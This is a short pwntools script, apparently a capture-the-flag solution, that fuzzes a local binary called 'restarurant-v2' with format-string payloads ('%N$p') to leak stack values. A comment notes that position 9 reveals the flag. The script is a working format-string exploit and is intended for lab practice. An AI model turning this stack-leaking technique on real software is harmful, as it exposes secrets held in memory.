# step 1 - fuzz
from pwn import *

exe = './restarurant-v2'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=True)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'error'

for i in range(1,100):

    p = process(exe)
    p.recvuntil(b'!')
    p.sendafter(b'\n',f'%{i}$p\n'.encode())
    
    flag = p.recvuntil(b'\n')
    # print(flag)
    p.sendafter(b':', flag)
    p.recvline()
    result =p.recvline() 
    if b'Permission denied!' not in result:
        print(i,result)
    p.close()
    

# the flag must be on the stack, test all values from the stack, we see that at position 9 we get somehting else then Permission denied. So that is the flag.